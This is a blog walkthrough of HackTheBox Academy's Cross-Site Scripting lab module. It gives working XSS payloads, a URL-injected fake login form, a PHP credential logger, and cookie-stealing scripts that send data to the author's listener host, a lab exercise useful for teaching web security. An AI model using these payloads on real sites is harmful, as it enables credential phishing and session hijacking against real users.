---
title: "[HTB_Academy] Cross-Site Scripting (XSS)"
excerpt: "**Cross-Site Scripting (XSS)** Module Walkthrough - HackTheBox Academy"
header:
  overlay_image: /assets/images/HTB_Cross-Site_Scripting_(XSS)/banner.png
  teaser: /assets/images/HTB_Cross-Site_Scripting_(XSS)/upper.png
  og_image: /assets/images/HTB_Cross-Site_Scripting_(XSS)/upper.png
categories:
  - HTB-Academy
tags:
  - HTB-Academy
  - Bug Bounty Hunter
  - Penetration Tester
  - Web
  - OWASP TOP 10
layout: single
toc: true
---
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\upper.png)

## Disclaimer
<img style="float: left; padding-right:10px" src="\assets\images\disclaimer.png" width="110" height="110">

<div style="text-align: justify">The following post may contain spoilers. Use it as a guide or support. It is always better to try it by yourself!</div>
<div style="text-align: justify">Enjoy :)</div>

## Resources
<img style="float: left; padding-right:10px" src="\assets\images\github.avif" width="110" height="110">
<div style="text-align: justify">All resources can be found in the following GitHub repository:</div>
[R4fik1-HTB_Cross-Site_Scripting_Repository](https://github.com/r4fik1/HTB_Academy/tree/main/HTB_Cross-Site_Scripting)

## Module Summary

Web Application Penetration Testing is a vital part of any penetration test. It plays an essential role in identifying critical vulnerabilities that may lead to the organization's assets being compromised. Cross-Site Scripting (XSS) vulnerabilities are among the most common vulnerabilities in any web application, with studies indicating that over 80% of all web applications are vulnerable to it. An XSS vulnerability may allow an attacker to execute arbitrary JavaScript code within the target's browser, leading to various types of attacks, including compromising web admins and their web applications.

While many organizations choose to ignore XSS vulnerabilities, as it only affects end-users without having a direct ability to execute code on the back-end server, in this module, we will discuss why XSS should be taken seriously. We will discuss the three types of XSS vulnerabilities, how to identify them, and how to exploit them.

In addition to this, the Cross-Site Scripting (XSS) module will teach you the following:

  - What is an XSS vulnerability?
  - History of XSS attacks in real-life
  - What are Stored XSS, Reflected XSS, and DOM-based XSS vulnerabilities
  - Techniques to identify XSS vulnerabilities
  - Performing Defacing attacks to change the look of a website
  - Performing Phishing attacks to steal the victim's login details and to perform a phishing simulation exercise
  - Performing Session Hijacking attacks to obtain the victim's session cookie and use them to access their account
  - Front-end and Back-end steps to prevent XSS vulnerabilities and protect your web application against them
  

## Stored XSS
 
>**Q. To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.**


<div style="text-align: justify">1. Access the target. There is a box that asks for a ticket. Write the following script and press enter.</div>
```javascript
<script>alert(document.cookie)</script>
```
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q1\1.png)



<div style="text-align: justify">2. You get the banner in a pop-up.</div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q1\2.png)



## Reflected XSS

>**Q. To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.**


<div style="text-align: justify">3. Enter the following script in the box and press the "Add" button.</div>
```javascript
<script>alert(document.cookie)</script>
```
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q2\1.png)

<div style="text-align: justify">4. You get the banner in a pop-up.</div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q2\2.png)



## DOM XSS
 
>**Q. To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.**


<div style="text-align: justify">5. Enter the following script in the box and press the "Add" button.</div>
```javascript
<img src="" onerror=alert(document.cookie)>
```
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q3\1.png)



<div style="text-align: justify">6. You get the banner in a pop-up.</div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q3\2.png)



## XSS Discovery

>**Q. Utilize some of the techniques mentioned in this section to identify the vulnerable input parameter found in the above server. What is the name of the vulnerable parameter?**

<div style="text-align: justify">7. Access the url which is a registration form. Fill all fields with test text. Open the developer tools of the web browser and check the status of the request response.</div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q4\0.png)



<div style="text-align: justify">8. Using the python tool "xsstrike" the vulnerable parameter is obtained.</div>
```bash
python xsstrike.py -u "http://94.237.62.6:55605/?fullname=a&username=a&password=a&email=a%40a.aa" 
```
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q4\1.png)

>**Q. What type of XSS was found on the above server? "name only"**


<div style="text-align: justify">9. Using the python tool "xsstrike" gets the XSS type.</div>
```bash
python xsstrike.py -u "http://94.237.62.6:55605/?fullname=a&username=a&password=a&email=a%40a.aa" 
```
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q4\2.png)


## Phishing

>**Q. Try to find a working XSS payload for the Image URL form found at '/phishing' in the above server, and then use what you learned in this section to prepare a malicious URL that injects a malicious login form. Then visit '/phishing/send.php' to send the URL to the victim, and they will log into the malicious login form. If you did everything correctly, you should receive the victim's login credentials, which you can use to login to '/phishing/login.php' and obtain the flag.**


<div style="text-align: justify">10. Access the target by pointing to "/phishing". Contains a box where to paste the URL of an image.</div>
```bash
http://10.129.252.57/phishing/
```
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q5\1.png)


<div style="text-align: justify">11. Try entering the following URL: www.hackthebox.eu/images/logo-htb.svg. The image is loaded.</div>
```bash
http://10.129.252.57/phishing/index.php?url=httos%3A%2F%2Fwww.hackthebox.eu%2Fimages%2Flogo-htb.svg
```
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q5\2.png)


<div style="text-align: justify">12. Find your own IP with ifconfig to create open a listener.</div>
```bash
ifconfig
```
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q5\3.png)


<div style="text-align: justify">13. As url parameter value in the URL use the following script. It is verified that it is vulnerable to XSS.</div>
```bash
http://10.129.252.57/phishing/index.php?url=<script>alert(window.origin)</script>
```
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q5\4.png)


<div style="text-align: justify">14. Through "document.write" load a login form to falsify the web. The "Image URL" box should be removed.</div>
```bash
http://10.129.252.57/phishing/index.php?url='/><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.14.46:3333><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');</script><!--
```
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q5\5.png)


<div style="text-align: justify">15. With the following parameter "document.getElementById('urlform').remove()" the "Image URL" box is removed.</div>
```bash
http://10.129.252.57/phishing/index.php?url=%27/%3E%3Cscript%3Edocument.write(%27%3Ch3%3EPlease%20login%20to%20continue%3C/h3%3E%3Cform%20action=http://10.10.14.46:3333%3E%3Cinput%20type=%22username%22%20name=%22username%22%20placeholder=%22Username%22%3E%3Cinput%20type=%22password%22%20name=%22password%22%20placeholder=%22Password%22%3E%3Cinput%20type=%22submit%22%20name=%22submit%22%20value=%22Login%22%3E%3C/form%3E%27);document.getElementById(%27urlform%27).remove();%3C/script%3E%3C!--
```
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q5\6.png)


<div style="text-align: justify">16. Create a PHP listener on port 3333.</div>
```bash
mkdir /tmp/server
cd /tmp/server
nano index.php
```



```bash
sudo php -S 0.0.0.0:3333
```

```bash
cat creds.txt
```

![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q5\7.png)


<div style="text-align: justify">17. We use a basic PHP script that logs the credentials from the HTTP request and then returns the victim to the original page without any injections</div>
```bash
cat index.php
```

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q5\8.png)

<div style="text-align: justify">18. Access the following URL created earlier to send the phishing to the user.</div>
```bash
http://10.129.252.57/phishing/send.php
```
```bash
http://10.129.252.57/phishing/index.php?url=%27/%3E%3Cscript%3Edocument.write(%27%3Ch3%3EPlease%20login%20to%20continue%3C/h3%3E%3Cform%20action=http://10.10.14.46:3333%3E%3Cinput%20type=%22username%22%20name=%22username%22%20placeholder=%22Username%22%3E%3Cinput%20type=%22password%22%20name=%22password%22%20placeholder=%22Password%22%3E%3Cinput%20type=%22submit%22%20name=%22submit%22%20value=%22Login%22%3E%3C/form%3E%27);document.getElementById(%27urlform%27).remove();%3C/script%3E%3C!--
```
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q5\9.png)


<div style="text-align: justify">19. The listener captures the username and password.</div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q5\10.png)


<div style="text-align: justify">20. Access the login and enter the previously stolen credentials.</div>
```bash
http://10.129.252.57/phishing/login.php
```
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q5\11.png)


<div style="text-align: justify">21. Get the flag.</div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q5\12.png)



## Session Hijacking

>**Q. Try to repeat what you learned in this section to identify the vulnerable input field and find a working XSS payload, and then use the 'Session Hijacking' scripts to grab the Admin's cookie and use it in 'login.php' to get the flag.**


<div style="text-align: justify">22. Access the target. It is a registration form.</div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q6\1.png)



<div style="text-align: justify">23. Find if the record is vulnerable with the following scripts in the fields.</div>
```javascript
"><script src=http://10.10.14.46:3333/></script>
"><script src=http://10.10.14.46:3333/></script>
"><script src=http://10.10.14.46:3333/></script>
"><script src=http://10.10.14.46:3333/></script>
```
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q6\2.png)


<div style="text-align: justify">24. Open a listener. It is verified that a vulnerable field exists.</div>
```bash
sudo php -S 0.0.0.0:3333
```
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q6\3.png)


<div style="text-align: justify">25. Search for the vulnerable field by entering a name for each script. Tip: We will notice that the email must match an email format, even if we try manipulating the HTTP request parameters, as it seems to be validated on both the front-end and the back-end. Hence, the email field is not vulnerable, and we can skip testing it. Likewise, we may skip the password field, as passwords are usually hashed and not usually shown in cleartext. This helps us in reducing the number of potentially vulnerable input fields we need to test.
Look for the position.</div>
```javascript
"><script src=http://10.10.14.46:3333/fullname></script>
"><script src=http://10.10.14.46:3333/username></script>
"><script src=http://10.10.14.46:3333/password></script>
"><script src=http://10.10.14.46:3333/url></script>
```
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q6\4.png)


<div style="text-align: justify">26. The vulnerable field is "url".</div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q6\5.png)


<div style="text-align: justify">27. Create the following script to steal the cookie.</div>
```bash
nano script.js
```
```bash
new Image().src='http://10.10.14.46/index.php?c='+document.cookie;
```
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q6\6.png)

<div style="text-align: justify">28. Write that script in the url field to access it from the listener.</div>
```javascript
<script src=http://10.10.14.46:3333/script.js></script>
```
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q6\7.png)

<div style="text-align: justify">29. The cookie is captured.</div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q6\8.png)

<div style="text-align: justify">30.  Access "login.php". Click on "+" to add the cookie and add the cookie.</div>
```bash
http://10.129.134.2/hijacking/login.php
```
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q6\9.png)

<div style="text-align: justify">31. The flag is obtained.</div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q6\10.png)

## Skills Assessment

>**Q. What is the value of the 'flag' cookie?**


<div style="text-align: justify">32. Access the target and click on "Welcome to Security Blog".</div>
```bash
http://10.129.13.2/assessment
```
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q7\1.png)


<div style="text-align: justify">33. Write the scripts in all the fields always putting a name to detect the vulnerable field.</div>
```javascript
"><script src=http://10.10.14.46:3333/coment></script>
"><script src=http://10.10.14.46:3333/name></script>
"><script src=http://10.10.14.46:3333/url></script>
```
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q7\2.png)

<div style="text-align: justify">34. Open a listener. The vulnerable field is "url".</div>
```bash
sudo php -S 0.0.0.0:3333
```
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q7\3.png)

<div style="text-align: justify">35. Create the following script to steal the cookie.</div>
```bash
nano script.js
```
```bash
new Image().src='http://10.10.14.46/index.php?c='+document.cookie;
```
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q7\4.png)

<div style="text-align: justify">36. Write that script in the url field to access it from the listener.</div>
```javascript
<script src=http://10.10.14.46:3333/script.js></script>
```
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q7\5.png)

<div style="text-align: justify">37. In the listener the flag inside the cookie is obtained.</div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q7\6.png)